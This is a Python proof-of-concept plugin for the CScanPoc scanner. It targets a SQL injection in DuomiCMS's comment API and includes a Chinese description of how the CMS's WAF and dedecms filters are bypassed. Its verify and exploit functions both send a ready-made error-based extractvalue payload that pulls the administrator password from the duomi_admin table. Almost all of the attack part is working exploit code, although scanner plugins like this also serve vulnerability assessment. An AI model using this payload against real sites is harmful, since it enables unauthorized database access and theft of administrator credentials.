# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib.request
import urllib.parse
import urllib.error
import urllib.request
import urllib.error
import urllib.parse
import re
import hashlib


class Vuln(ABVuln):
    vuln_id = 'DuomiCMS_0001'  # 平台漏洞编号，留空
    name = 'DuomiCMS 前台SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2016-12-30'  # 漏洞公布时间
    desc = '''
        1. duomicms在SQL防注入方面做了2层安全检测，第一层检测是在代码入口处，使用了360的简易WAF规则。第二层是在数据库查询入口处使用了dedecms的SQL检测函数。
        2. duomicms使用了伪全局变量，对GET/POST/COOKIE中的变量做了addslashes.
        由上可知要完成注入的必要条件有：
        1. 注入点无单引号保护，
        2. 绕过文件入口处的360WAF规则和数据库查询入口处的dedecms SQL检查函数。

        注入点：/interface/comment/api/index.php文件中的Readrlist函数。
    '''  # 漏洞描述
    ref = 'http://www.webbaozi.com/dmsj/38.html'  # 漏洞来源http://0day5.com/archives/4339/
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'DuomiCMS'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '453811e5-a008-4645-a2cc-dca58fdeba5b'
    author = '47bwy'  # POC编写者
    create_date = '2018-06-08'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            payload = '''/interface/comment/api/index.php?gid=1&page=2&rlist[0]=`'`.``.id, extractvalue(1, concat_ws(0x20, 0x5c,(select`password` from duomi_admin limit 1))),`'`.``.id'''
            url = '{target}'.format(target=self.target) + payload
            r = requests.get(url)
            if 'duomicms Error Warning' in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            payload = '''/interface/comment/api/index.php?gid=1&page=2&rlist[0]=`'`.``.id, extractvalue(1, concat_ws(0x20, 0x5c,(select`password` from duomi_admin limit 1))),`'`.``.id'''
            url = '{target}'.format(target=self.target) + payload
            r = requests.get(url)
            if 'duomicms Error Warning' in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞，漏洞地址为{url}'.format(
                    target=self.target, name=self.vuln.name, url=url))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))


if __name__ == '__main__':
    Poc().run()
